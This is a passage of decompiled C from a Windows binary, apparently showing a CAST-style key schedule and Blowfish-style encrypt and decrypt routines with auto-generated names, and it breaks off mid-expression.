  v218[2] = v21 ^ dword_526FE0[v14] ^ dword_526FE0[BYTE2(v178)] ^ dword_5267E0[HIBYTE(v182)] ^ dword_526BE0[BYTE2(v182)];
  v218[3] = v141 ^ dword_5273E0[v13] ^ dword_5273E0[HIBYTE(v182)] ^ dword_526BE0[(unsigned __int8)v182] ^ dword_5267E0[BYTE1(v182)];
  v22 = v178 ^ v148 ^ dword_526FE0[v13] ^ dword_526FE0[HIBYTE(v174)] ^ dword_5267E0[BYTE2(v174)] ^ dword_526BE0[v211];
  v23 = dword_526BE0[(unsigned __int8)((unsigned __int16)(v178 ^ v148 ^ LOWORD(dword_526FE0[v13]) ^ LOWORD(dword_526FE0[HIBYTE(v174)]) ^ LOWORD(dword_5267E0[BYTE2(v174)]) ^ LOWORD(dword_526BE0[v211])) >> 8)];
  v24 = (unsigned __int8)v22;
  v202 = v22;
  v22 >>= 24;
  v149 = v23;
  v25 = dword_5273E0[v24] ^ dword_526FE0[BYTE2(v202)] ^ dword_5267E0[v22];
  v189 = v24;
  v26 = v170 ^ v21 ^ v23 ^ v25;
  v186 = v22;
  v27 = (unsigned __int8)v26;
  v203 = v26;
  v28 = HIBYTE(v26);
  v29 = BYTE2(v26);
  v30 = dword_526BE0[BYTE1(v26)];
  v31 = v30 ^ v174 ^ dword_526FE0[BYTE2(v26)] ^ dword_5273E0[HIBYTE(v26)] ^ dword_5267E0[v15];
  v190 = v28;
  v193 = v27;
  v32 = dword_5267E0[v27] ^ v31;
  v33 = (unsigned __int8)v32;
  BYTE2(v27) = BYTE2(v32);
  v204 = v32;
  v154 = v30;
  BYTE1(v30) = BYTE1(v32);
  v34 = HIBYTE(v32);
  v35 = dword_526FE0[(unsigned __int8)v32];
  v197 = v33;
  v36 = BYTE2(v27);
  v37 = BYTE1(v30);
  v38 = dword_5267E0[v37] ^ dword_526BE0[v36] ^ v35;
  v194 = v34;
  v39 = v182 ^ dword_5273E0[v34] ^ dword_526BE0[v14] ^ v38;
  v201 = (unsigned __int8)v39;
  v205 = v39;
  v200 = BYTE1(v39);
  v142 = dword_526FE0[HIBYTE(v39)];
  v218[4] = v142 ^ v149 ^ dword_5273E0[BYTE2(v39)] ^ dword_5267E0[v34] ^ dword_5267E0[v189];
  v218[5] = dword_5273E0[(unsigned __int8)v39] ^ dword_526FE0[BYTE1(v39)] ^ dword_526BE0[BYTE2(v39)] ^ dword_5267E0[BYTE2(v202)] ^ dword_526BE0[v186];
  v40 = dword_526FE0[v34];
  v218[6] = dword_5267E0[v193] ^ v154 ^ v40 ^ dword_5273E0[v36] ^ dword_526FE0[v189];
  v218[7] = dword_5273E0[v193] ^ dword_5267E0[v29] ^ dword_526BE0[v190] ^ dword_526FE0[v37] ^ dword_5273E0[v33];
  v41 = v202 ^ v142 ^ v40 ^ dword_526BE0[(unsigned __int8)v39] ^ dword_5273E0[BYTE1(v39)] ^ dword_5267E0[BYTE2(v39)];
  v42 = (unsigned __int8)v41;
  v171 = v41;
  v43 = HIBYTE(v41);
  v44 = BYTE1(v41);
  v143 = dword_526BE0[v44];
  v45 = dword_526FE0[BYTE2(v171)] ^ dword_5273E0[v42] ^ dword_5273E0[v37];
  v208 = v42;
  v46 = dword_5267E0[v43] ^ v45;
  v207 = v43;
  v47 = v204 ^ v143 ^ v46;
  v48 = (unsigned __int8)v47;
  v175 = v47;
  v209 = HIBYTE(v47);
  v49 = BYTE1(v47);
  v159 = dword_526BE0[v49];
  v50 = (unsigned __int8)((v204 ^ v143 ^ v46) >> 16);
  v51 = dword_526FE0[v50] ^ dword_5267E0[v36];
  v211 = v48;
  v179 = v205 ^ v159 ^ dword_5267E0[v48] ^ dword_5273E0[v209] ^ v51;
  v214 = (unsigned __int8)v179;
  v213 = BYTE1(v179);
  v212 = HIBYTE(v179);
  v52 = dword_5267E0[BYTE2(v171)];
  v53 = dword_5267E0[v50];
  v54 = v203 ^ dword_5273E0[HIBYTE(v179)] ^ dword_526BE0[BYTE2(v179)] ^ dword_5267E0[BYTE1(v179)] ^ dword_526FE0[(unsigned __int8)v179] ^ dword_526BE0[v197];
  v55 = dword_5273E0[v49];
  v217 = (unsigned __int8)v54;
  v183 = v54;
  v216 = BYTE1(v54);
  v215 = HIBYTE(v54);
  v56 = dword_5273E0[BYTE2(v179)];
  v57 = dword_5267E0[v208] ^ dword_5267E0[BYTE2(v179)] ^ dword_526FE0[HIBYTE(v54)] ^ dword_5273E0[BYTE2(v54)];
  v58 = dword_526FE0[BYTE1(v54)];
  v218[8] = v143 ^ v57;
  v218[9] = v52 ^ dword_526BE0[v207] ^ dword_526BE0[v215] ^ dword_5273E0[v217] ^ v58;
  v218[10] = v159 ^ dword_5267E0[v211] ^ dword_526FE0[v44] ^ dword_526FE0[HIBYTE(v179)] ^ v56;
  v218[11] = v55 ^ v53 ^ dword_526BE0[v209] ^ dword_526FE0[BYTE1(v179)] ^ dword_5273E0[(unsigned __int8)v179];
  v202 = v179 ^ v55 ^ v53 ^ dword_526FE0[v207] ^ dword_526FE0[v209] ^ dword_526BE0[v211];
  v189 = (unsigned __int8)v202;
  v186 = HIBYTE(v202);
  v167 = dword_526FE0[BYTE2(v202)];
  v203 = v171 ^ v167 ^ dword_5273E0[v44] ^ dword_5273E0[(unsigned __int8)v202] ^ dword_526BE0[BYTE1(v202)] ^ dword_5267E0[HIBYTE(v202)];
  v59 = dword_5273E0[HIBYTE(v203)];
  v60 = dword_526FE0[BYTE2(v203)];
  v204 = v52 ^ v60 ^ v59 ^ v175 ^ dword_5267E0[(unsigned __int8)v203] ^ dword_526BE0[BYTE1(v203)];
  v163 = v60;
  v193 = (unsigned __int8)v203;
  v155 = dword_5267E0[BYTE1(v204)];
  v197 = (unsigned __int8)v204;
  v150 = dword_526BE0[BYTE2(v204)];
  v61 = v155 ^ v150 ^ v183 ^ dword_5273E0[HIBYTE(v204)] ^ dword_526BE0[v208] ^ dword_526FE0[(unsigned __int8)v204];
  v201 = (unsigned __int8)v61;
  v205 = v61;
  v200 = BYTE1(v61);
  v198 = HIBYTE(v61);
  v62 = dword_526BE0[(unsigned __int8)v203];
  v63 = BYTE2(v61);
  v218[12] = v150 ^ dword_526FE0[(unsigned __int8)v203] ^ dword_5273E0[BYTE1(v203)] ^ dword_5267E0[HIBYTE(v204)] ^ dword_5267E0[(unsigned __int8)v202];
  v206 = dword_526BE0[(unsigned __int8)v204];
  v64 = v59 ^ v155 ^ v206 ^ v62;
  v65 = dword_5273E0[BYTE1(v202)];
  v66 = dword_526FE0[HIBYTE(v204)];
  v218[13] = v163 ^ v64;
  v218[14] = v66 ^ dword_526BE0[v63] ^ dword_5267E0[v198] ^ dword_526FE0[(unsigned __int8)v202] ^ v65;
  v67 = dword_526BE0[v201];
  v218[15] = v67 ^ v167 ^ dword_5267E0[v200] ^ dword_5273E0[v63] ^ dword_5273E0[HIBYTE(v202)];
  v68 = v202 ^ v67 ^ v66 ^ dword_5273E0[v200] ^ dword_5267E0[v63] ^ dword_526FE0[v198];
  v69 = (unsigned __int8)v68;
  BYTE1(v57) = BYTE1(v68);
  v172 = v68;
  v70 = HIBYTE(v68);
  v71 = BYTE2(v68);
  v144 = dword_526FE0[v71];
  v72 = BYTE1(v57);
  v73 = dword_526BE0[v72] ^ dword_5273E0[v69] ^ dword_5273E0[BYTE1(v204)];
  v208 = v69;
  v74 = dword_5267E0[v70] ^ v73;
  v207 = v70;
  v75 = v204 ^ v144 ^ v74;
  v210 = BYTE2(v75);
  v164 = dword_526FE0[BYTE2(v75)];
  v160 = dword_526BE0[BYTE1(v75)];
  v76 = dword_5267E0[(unsigned __int8)v75] ^ dword_5267E0[BYTE2(v204)];
  v176 = v75;
  v209 = HIBYTE(v75);
  v77 = v205 ^ dword_5273E0[HIBYTE(v75)] ^ v164 ^ v160 ^ v76;
  v211 = (unsigned __int8)v75;
  v180 = v77;
  v214 = (unsigned __int8)v77;
  v78 = BYTE2(v77);
  v79 = dword_5267E0[BYTE1(v77)];
  v212 = HIBYTE(v77);
  v168 = v79;
  v156 = dword_526BE0[BYTE2(v77)];
  v80 = v203 ^ v156 ^ v79 ^ v206 ^ dword_5273E0[HIBYTE(v77)] ^ dword_526FE0[(unsigned __int8)v77];
  v217 = (unsigned __int8)v80;
  BYTE1(v77) = BYTE1(v80);
  BYTE2(v75) = BYTE2(v80);
  v184 = v80;
  v215 = HIBYTE(v80);
  v151 = dword_5273E0[BYTE1(v75)];
  v81 = dword_5267E0[v72] ^ dword_526FE0[(unsigned __int8)v75] ^ dword_5267E0[v212];
  v82 = dword_5273E0[v72];
  v219[0] = v156 ^ v151 ^ v81;
  v83 = dword_5267E0[BYTE1(v77)];
  v219[1] = dword_5273E0[v209] ^ v164 ^ v160 ^ v168 ^ dword_526BE0[v214];
  v219[2] = v82 ^ dword_526FE0[v208] ^ dword_526FE0[v78] ^ dword_5267E0[v215] ^ dword_526BE0[BYTE2(v75)];
  v219[3] = v144 ^ dword_5273E0[v207] ^ dword_5273E0[v215] ^ dword_526BE0[v217] ^ v83;
  v84 = v180 ^ v151 ^ dword_526FE0[v207] ^ dword_526FE0[v209] ^ dword_5267E0[v210] ^ dword_526BE0[(unsigned __int8)v75];
  v85 = dword_526BE0[(unsigned __int8)((unsigned __int16)(v180 ^ v151 ^ LOWORD(dword_526FE0[v207]) ^ LOWORD(dword_526FE0[v209]) ^ LOWORD(dword_5267E0[v210]) ^ LOWORD(dword_526BE0[(unsigned __int8)v75])) >> 8)];
  v86 = (unsigned __int8)v84;
  v202 = v84;
  v87 = BYTE2(v84);
  v84 >>= 24;
  v88 = dword_5267E0[v84];
  v189 = v86;
  v186 = v84;
  v152 = v85;
  v89 = v172 ^ v82 ^ v85 ^ dword_5273E0[v86] ^ dword_526FE0[v87] ^ v88;
  v90 = (unsigned __int8)v89;
  v203 = v89;
  v91 = HIBYTE(v89);
  v92 = BYTE2(v89);
  v93 = dword_526BE0[BYTE1(v89)];
  v94 = v93 ^ v176 ^ dword_526FE0[BYTE2(v89)] ^ dword_5273E0[HIBYTE(v89)] ^ dword_5267E0[v71];
  v190 = v91;
  v193 = v90;
  v95 = dword_5267E0[v90] ^ v94;
  v96 = (unsigned __int8)v95;
  BYTE2(v90) = BYTE2(v95);
  v204 = v95;
  v157 = v93;
  BYTE1(v93) = BYTE1(v95);
  v97 = HIBYTE(v95);
  v98 = dword_526FE0[(unsigned __int8)v95];
  v197 = v96;
  v99 = BYTE2(v90);
  v100 = BYTE1(v93);
  v101 = dword_5267E0[v100] ^ dword_526BE0[v99] ^ v98;
  v194 = v97;
  v205 = v184 ^ dword_5273E0[v97] ^ dword_526BE0[v208] ^ v101;
  v201 = (unsigned __int8)v205;
  v200 = BYTE1(v205);
  v145 = dword_526FE0[HIBYTE(v205)];
  v219[4] = v145 ^ v152 ^ dword_5273E0[BYTE2(v205)] ^ dword_5267E0[v97] ^ dword_5267E0[v189];
  v219[5] = dword_5273E0[(unsigned __int8)v205] ^ dword_526FE0[BYTE1(v205)] ^ dword_526BE0[BYTE2(v205)] ^ dword_5267E0[v87] ^ dword_526BE0[v186];
  v102 = dword_526FE0[v97];
  v219[6] = dword_5267E0[v193] ^ v157 ^ v102 ^ dword_5273E0[v99] ^ dword_526FE0[v189];
  v219[7] = dword_5273E0[v193] ^ dword_5267E0[v92] ^ dword_526BE0[v190] ^ dword_526FE0[v100] ^ dword_5273E0[v96];
  v103 = v202 ^ v145 ^ v102 ^ dword_526BE0[(unsigned __int8)v205] ^ dword_5273E0[BYTE1(v205)] ^ dword_5267E0[BYTE2(v205)];
  v104 = (unsigned __int8)v103;
  BYTE2(v96) = BYTE2(v103);
  v173 = v103;
  v105 = HIBYTE(v103);
  v106 = BYTE1(v103);
  v146 = dword_526BE0[v106];
  v107 = BYTE2(v96);
  v108 = dword_526FE0[v107] ^ dword_5273E0[v104] ^ dword_5273E0[v100];
  v208 = v104;
  v109 = dword_5267E0[v105] ^ v108;
  v207 = v105;
  v110 = v204 ^ v146 ^ v109;
  v111 = (unsigned __int8)v110;
  BYTE2(v105) = BYTE2(v110);
  v177 = v110;
  v209 = HIBYTE(v110);
  v112 = BYTE1(v110);
  v161 = dword_526BE0[v112];
  v113 = dword_5267E0[v99];
  v211 = v111;
  v114 = BYTE2(v105);
  v115 = v205 ^ v161 ^ dword_5267E0[v111] ^ dword_5273E0[v209] ^ dword_526FE0[v114] ^ v113;
  v116 = (unsigned __int8)v115;
  v181 = v115;
  v213 = BYTE1(v115);
  BYTE2(v111) = BYTE2(v115);
  v212 = HIBYTE(v115);
  v117 = dword_526FE0[(unsigned __int8)v115] ^ dword_526BE0[v197];
  v214 = v116;
  v118 = BYTE2(v111);
  v119 = v203 ^ dword_5273E0[v212] ^ dword_526BE0[v118] ^ dword_5267E0[v213] ^ v117;
  v120 = dword_5267E0[v107];
  v217 = (unsigned __int8)v119;
  v185 = v119;
  v216 = BYTE1(v119);
  v215 = HIBYTE(v119);
  v121 = dword_5267E0[v118] ^ dword_526FE0[HIBYTE(v119)] ^ dword_5273E0[BYTE2(v119)];
  v122 = dword_5273E0[v118];
  v123 = dword_526FE0[BYTE1(v119)];
  v124 = dword_5267E0[v114];
  v219[8] = v146 ^ dword_5267E0[v208] ^ v121;
  v125 = dword_5273E0[v112];
  v219[9] = v120 ^ dword_526BE0[v207] ^ dword_526BE0[v215] ^ dword_5273E0[v217] ^ v123;
  v219[10] = v161 ^ dword_5267E0[v211] ^ dword_526FE0[v106] ^ dword_526FE0[v212] ^ v122;
  v219[11] = v125 ^ v124 ^ dword_526BE0[v209] ^ dword_526FE0[v213] ^ dword_5273E0[v214];
  v126 = v181 ^ v125 ^ v124 ^ dword_526FE0[v207] ^ dword_526FE0[v209] ^ dword_526BE0[v211];
  v127 = (unsigned __int8)v126;
  v186 = HIBYTE(v126);
  v128 = BYTE1(v126);
  v129 = dword_526BE0[BYTE1(v126)] ^ dword_5267E0[HIBYTE(v126)];
  v130 = dword_526FE0[BYTE2(v126)];
  v131 = v173 ^ v130 ^ dword_5273E0[v106] ^ dword_5273E0[v127] ^ v129;
  v169 = v130;
  v132 = BYTE1(v131);
  v193 = (unsigned __int8)v131;
  v147 = dword_5273E0[HIBYTE(v131)];
  v165 = dword_526FE0[BYTE2(v131)];
  v133 = v120 ^ v165 ^ v147 ^ v177 ^ dword_5267E0[(unsigned __int8)v131] ^ dword_526BE0[BYTE1(v131)];
  v134 = (unsigned __int8)v133;
  BYTE1(v130) = BYTE1(v133);
  BYTE2(v120) = BYTE2(v133);
  v194 = HIBYTE(v133);
  v135 = dword_526FE0[(unsigned __int8)v133];
  v197 = v134;
  v136 = dword_5267E0[BYTE1(v130)];
  v137 = dword_526BE0[BYTE2(v120)];
  v138 = v136 ^ v137 ^ v185 ^ dword_5273E0[v194] ^ dword_526BE0[v208] ^ v135;
  v201 = (unsigned __int8)v138;
  v198 = HIBYTE(v138);
  v219[12] = v137 ^ dword_526FE0[v193] ^ dword_5273E0[v132] ^ dword_5267E0[v194] ^ dword_5267E0[v127];
  v219[13] = v165 ^ v147 ^ v136 ^ dword_526BE0[v193] ^ dword_526BE0[v197];
  v139 = dword_5267E0[BYTE1(v138)] ^ dword_526BE0[(unsigned __int8)v138];
  v219[14] = dword_526BE0[BYTE2(v138)] ^ dword_526FE0[v194] ^ dword_526FE0[v127] ^ dword_5273E0[v128] ^ dword_5267E0[HIBYTE(v138)];
  v219[15] = v169 ^ dword_5273E0[BYTE2(v138)] ^ dword_5273E0[v186] ^ v139;
  for ( result = 0; result < 16; ++result )
  {
    *(_DWORD *)(a1 + 8 * result) = v218[result];
    *(_DWORD *)(a1 + 8 * result + 4) = ((unsigned __int8)v219[result] - 16) & 0x1F;
  }
  return result;
}
// 5267E0: using guessed type int dword_5267E0[256];
// 526BE0: using guessed type int dword_526BE0[256];
// 526FE0: using guessed type int dword_526FE0[256];
// 5273E0: using guessed type int dword_5273E0[256];

//----- (004B2780) --------------------------------------------------------
int __cdecl sub_4B2780(int a1, int a2)
{
  int v2; // ecx
  int v3; // esi
  int v4; // edi
  int v5; // ecx
  int v6; // esi
  int v7; // edi
  int v8; // esi
  int v9; // edi
  int v10; // esi
  int v11; // edi
  int v12; // esi
  int v13; // edi
  int v14; // esi
  int v15; // edi
  int v16; // esi
  int v17; // edi
  int v18; // esi
  int result; // eax
  int v20; // edx

  v2 = (unsigned __int8)((unsigned __int16)(*(_WORD *)a2 ^ *(_WORD *)a1) >> 8);
  v3 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)(*(_BYTE *)a2 ^ *(_BYTE *)a1) + 3144)
      + (*(_DWORD *)(a2 + 4 * v2 + 2120) ^ (*(_DWORD *)(a2
                                                      + 4 * ((unsigned int)(*(_DWORD *)a2 ^ *(_DWORD *)a1) >> 24)
                                                      + 72)
                                          + *(_DWORD *)(a2
                                                      + 4
                                                      * (unsigned __int8)((unsigned int)(*(_DWORD *)a2 ^ *(_DWORD *)a1) >> 16)
                                                      + 1096)))) ^ *(_DWORD *)(a2 + 4) ^ *(_DWORD *)(a1 + 4);
  v4 = (*(_DWORD *)(a2
                  + 4
                  * (unsigned __int8)((*(_BYTE *)(a2 + 4 * (unsigned __int8)(*(_BYTE *)a2 ^ *(_BYTE *)a1) + 3144)
                                     + (*(_BYTE *)(a2 + 4 * v2 + 2120) ^ (*(_BYTE *)(a2
                                                                                   + 4
                                                                                   * ((unsigned int)(*(_DWORD *)a2 ^ *(_DWORD *)a1) >> 24)
                                                                                   + 72)
                                                                        + *(_BYTE *)(a2
                                                                                   + 4
                                                                                   * (unsigned __int8)((unsigned int)(*(_DWORD *)a2 ^ *(_DWORD *)a1) >> 16)
                                                                                   + 1096)))) ^ *(_BYTE *)(a2 + 4) ^ *(_BYTE *)(a1 + 4))
                  + 3144)
      + (*(_DWORD *)(a2
                   + 4
                   * (unsigned __int8)((unsigned __int16)((*(_WORD *)(a2
                                                                    + 4 * (unsigned __int8)(*(_BYTE *)a2 ^ *(_BYTE *)a1)
                                                                    + 3144)
                                                         + (*(_WORD *)(a2 + 4 * v2 + 2120) ^ (*(_WORD *)(a2 + 4 * ((unsigned int)(*(_DWORD *)a2 ^ *(_DWORD *)a1) >> 24) + 72)
                                                                                            + *(_WORD *)(a2 + 4 * (unsigned __int8)((unsigned int)(*(_DWORD *)a2 ^ *(_DWORD *)a1) >> 16) + 1096)))) ^ *(_WORD *)(a2 + 4) ^ *(_WORD *)(a1 + 4)) >> 8)
                   + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v3) + 72) + *(_DWORD *)(a2 + 4 * BYTE2(v3) + 1096)))) ^ *(_DWORD *)(a2 + 8) ^ *(_DWORD *)a2 ^ *(_DWORD *)a1;
  v5 = (unsigned __int8)((unsigned __int16)((*(_WORD *)(a2
                                                      + 4
                                                      * (unsigned __int8)((*(_BYTE *)(a2
                                                                                    + 4
                                                                                    * (unsigned __int8)(*(_BYTE *)a2 ^ *(_BYTE *)a1)
                                                                                    + 3144)
                                                                         + (*(_BYTE *)(a2 + 4 * v2 + 2120) ^ (*(_BYTE *)(a2 + 4 * ((unsigned int)(*(_DWORD *)a2 ^ *(_DWORD *)a1) >> 24) + 72) + *(_BYTE *)(a2 + 4 * (unsigned __int8)((unsigned int)(*(_DWORD *)a2 ^ *(_DWORD *)a1) >> 16) + 1096)))) ^ *(_BYTE *)(a2 + 4) ^ *(_BYTE *)(a1 + 4))
                                                      + 3144)
                                           + (*(_WORD *)(a2
                                                       + 4
                                                       * (unsigned __int8)((unsigned __int16)((*(_WORD *)(a2 + 4 * (unsigned __int8)(*(_BYTE *)a2 ^ *(_BYTE *)a1) + 3144)
                                                                                             + (*(_WORD *)(a2 + 4 * v2 + 2120) ^ (*(_WORD *)(a2 + 4 * ((unsigned int)(*(_DWORD *)a2 ^ *(_DWORD *)a1) >> 24) + 72) + *(_WORD *)(a2 + 4 * (unsigned __int8)((unsigned int)(*(_DWORD *)a2 ^ *(_DWORD *)a1) >> 16) + 1096)))) ^ *(_WORD *)(a2 + 4) ^ *(_WORD *)(a1 + 4)) >> 8)
                                                       + 2120) ^ (*(_WORD *)(a2 + 4 * HIBYTE(v3) + 72)
                                                                + *(_WORD *)(a2 + 4 * BYTE2(v3) + 1096)))) ^ *(_WORD *)(a2 + 8) ^ *(_WORD *)a2 ^ *(_WORD *)a1) >> 8);
  v6 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v4 + 3144)
      + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v4) + 72)
                                          + *(_DWORD *)(a2 + 4 * BYTE2(v4) + 1096)))) ^ *(_DWORD *)(a2 + 12) ^ v3;
  LOBYTE(v5) = BYTE1(v6);
  v7 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v6 + 3144)
      + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v6) + 72)
                                          + *(_DWORD *)(a2 + 4 * BYTE2(v6) + 1096)))) ^ *(_DWORD *)(a2 + 16) ^ v4;
  LOBYTE(v5) = BYTE1(v7);
  v8 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v7 + 3144)
      + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v7) + 72)
                                          + *(_DWORD *)(a2 + 4 * BYTE2(v7) + 1096)))) ^ *(_DWORD *)(a2 + 20) ^ v6;
  LOBYTE(v5) = BYTE1(v8);
  v9 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v8 + 3144)
      + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v8) + 72)
                                          + *(_DWORD *)(a2 + 4 * BYTE2(v8) + 1096)))) ^ *(_DWORD *)(a2 + 24) ^ v7;
  LOBYTE(v5) = BYTE1(v9);
  v10 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v9 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v9) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v9) + 1096)))) ^ *(_DWORD *)(a2 + 28) ^ v8;
  LOBYTE(v5) = BYTE1(v10);
  v11 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v10 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v10) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v10) + 1096)))) ^ *(_DWORD *)(a2 + 32) ^ v9;
  LOBYTE(v5) = BYTE1(v11);
  v12 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v11 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v11) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v11) + 1096)))) ^ *(_DWORD *)(a2 + 36) ^ v10;
  LOBYTE(v5) = BYTE1(v12);
  v13 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v12 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v12) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v12) + 1096)))) ^ *(_DWORD *)(a2 + 40) ^ v11;
  LOBYTE(v5) = BYTE1(v13);
  v14 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v13 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v13) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v13) + 1096)))) ^ *(_DWORD *)(a2 + 44) ^ v12;
  LOBYTE(v5) = BYTE1(v14);
  v15 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v14 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v14) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v14) + 1096)))) ^ *(_DWORD *)(a2 + 48) ^ v13;
  LOBYTE(v5) = BYTE1(v15);
  v16 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v15 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v15) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v15) + 1096)))) ^ *(_DWORD *)(a2 + 52) ^ v14;
  LOBYTE(v5) = BYTE1(v16);
  v17 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v16 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v16) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v16) + 1096)))) ^ *(_DWORD *)(a2 + 56) ^ v15;
  LOBYTE(v5) = BYTE1(v17);
  v18 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v17 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v17) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v17) + 1096)))) ^ *(_DWORD *)(a2 + 60) ^ v16;
  LOBYTE(v5) = BYTE1(v18);
  result = a1;
  v20 = *(_DWORD *)(a2 + 68);
  *(_DWORD *)(a1 + 4) = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v18 + 3144)
                       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v18) + 72)
                                                           + *(_DWORD *)(a2 + 4 * BYTE2(v18) + 1096)))) ^ *(_DWORD *)(a2 + 64) ^ v17;
  *(_DWORD *)a1 = v20 ^ v18;
  return result;
}

//----- (004B2BA0) --------------------------------------------------------
int __cdecl sub_4B2BA0(int a1, int a2)
{
  int v2; // ecx
  int v3; // esi
  int v4; // edi
  int v5; // ecx
  int v6; // esi
  int v7; // edi
  int v8; // esi
  int v9; // edi
  int v10; // esi
  int v11; // edi
  int v12; // esi
  int v13; // edi
  int v14; // esi
  int v15; // edi
  int v16; // esi
  int v17; // edi
  int v18; // esi
  int result; // eax
  int v20; // edi
  int v21; // esi

  v2 = (unsigned __int8)((unsigned __int16)(*(_WORD *)(a2 + 68) ^ *(_WORD *)a1) >> 8);
  v3 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)(*(_BYTE *)(a2 + 68) ^ *(_BYTE *)a1) + 3144)
      + (*(_DWORD *)(a2 + 4 * v2 + 2120) ^ (*(_DWORD *)(a2
                                                      + 4 * ((unsigned int)(*(_DWORD *)(a2 + 68) ^ *(_DWORD *)a1) >> 24)
                                                      + 72)
                                          + *(_DWORD *)(a2
                                                      + 4
                                                      * (unsigned __int8)((unsigned int)(*(_DWORD *)(a2 + 68) ^ *(_DWORD *)a1) >> 16)
                                                      + 1096)))) ^ *(_DWORD *)(a2 + 64) ^ *(_DWORD *)(a1 + 4);
  v4 = (*(_DWORD *)(a2
                  + 4
                  * (unsigned __int8)((*(_BYTE *)(a2 + 4 * (unsigned __int8)(*(_BYTE *)(a2 + 68) ^ *(_BYTE *)a1) + 3144)
                                     + (*(_BYTE *)(a2 + 4 * v2 + 2120) ^ (*(_BYTE *)(a2
                                                                                   + 4
                                                                                   * ((unsigned int)(*(_DWORD *)(a2 + 68) ^ *(_DWORD *)a1) >> 24)
                                                                                   + 72)
                                                                        + *(_BYTE *)(a2
                                                                                   + 4
                                                                                   * (unsigned __int8)((unsigned int)(*(_DWORD *)(a2 + 68) ^ *(_DWORD *)a1) >> 16)
                                                                                   + 1096)))) ^ *(_BYTE *)(a2 + 64) ^ *(_BYTE *)(a1 + 4))
                  + 3144)
      + (*(_DWORD *)(a2
                   + 4
                   * (unsigned __int8)((unsigned __int16)((*(_WORD *)(a2
                                                                    + 4
                                                                    * (unsigned __int8)(*(_BYTE *)(a2 + 68) ^ *(_BYTE *)a1)
                                                                    + 3144)
                                                         + (*(_WORD *)(a2 + 4 * v2 + 2120) ^ (*(_WORD *)(a2 + 4 * ((unsigned int)(*(_DWORD *)(a2 + 68) ^ *(_DWORD *)a1) >> 24) + 72)
                                                                                            + *(_WORD *)(a2 + 4 * (unsigned __int8)((unsigned int)(*(_DWORD *)(a2 + 68) ^ *(_DWORD *)a1) >> 16) + 1096)))) ^ *(_WORD *)(a2 + 64) ^ *(_WORD *)(a1 + 4)) >> 8)
                   + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v3) + 72) + *(_DWORD *)(a2 + 4 * BYTE2(v3) + 1096)))) ^ *(_DWORD *)(a2 + 60) ^ *(_DWORD *)(a2 + 68) ^ *(_DWORD *)a1;
  v5 = (unsigned __int8)((unsigned __int16)((*(_WORD *)(a2
                                                      + 4
                                                      * (unsigned __int8)((*(_BYTE *)(a2
                                                                                    + 4
                                                                                    * (unsigned __int8)(*(_BYTE *)(a2 + 68) ^ *(_BYTE *)a1)
                                                                                    + 3144)
                                                                         + (*(_BYTE *)(a2 + 4 * v2 + 2120) ^ (*(_BYTE *)(a2 + 4 * ((unsigned int)(*(_DWORD *)(a2 + 68) ^ *(_DWORD *)a1) >> 24) + 72) + *(_BYTE *)(a2 + 4 * (unsigned __int8)((unsigned int)(*(_DWORD *)(a2 + 68) ^ *(_DWORD *)a1) >> 16) + 1096)))) ^ *(_BYTE *)(a2 + 64) ^ *(_BYTE *)(a1 + 4))
                                                      + 3144)
                                           + (*(_WORD *)(a2
                                                       + 4
